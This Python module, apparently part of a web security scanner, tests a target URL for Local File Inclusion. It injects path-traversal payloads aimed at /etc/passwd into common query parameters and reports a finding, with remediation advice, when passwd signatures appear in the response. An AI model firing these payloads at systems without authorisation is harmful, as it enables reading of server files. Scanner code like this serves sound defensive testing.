"""Deteção controlada de Local File Inclusion."""
import aiohttp
from urllib.parse import quote

from .core import Finding, ScanConfig, make_finding_id

PAYLOADS = [
    "../../../../etc/passwd",
    "....//....//....//etc/passwd",
]

SIGNATURES = ["root:x:", "root:*:", "daemon:x:"]


async def run(config: ScanConfig) -> list[Finding]:
    findings: list[Finding] = []
    params = config.options.get("file_params", ["file", "page", "path", "include", "template"])
    base = config.target

    async with aiohttp.ClientSession() as session:
        for param in params:
            for payload in PAYLOADS:
                url = f"{base}{'&' if '?' in base else '?'}{param}={quote(payload, safe='')}"
                try:
                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                        text = await resp.text(errors="ignore")
                except Exception:
                    continue

                for sig in SIGNATURES:
                    if sig in text:
                        findings.append(Finding(
                            id=make_finding_id("lfi", base, param, "LFI detected"),
                            module="lfi",
                            title=f"Possível LFI no parâmetro '{param}'",
                            severity="high",
                            confidence="medium",
                            category="lfi",
                            asset=base,
                            endpoint=f"?{param}=<path>",
                            evidence={"type": "http_response", "details": f"Assinatura '{sig}' encontrada"},
                            description="A resposta parece conter conteúdo de /etc/passwd.",
                            impact="Leitura de ficheiros locais do servidor.",
                            remediation="Usar allowlist de caminhos; nunca concatenar entrada em APIs de ficheiros.",
                        ))
                        break

    return findings
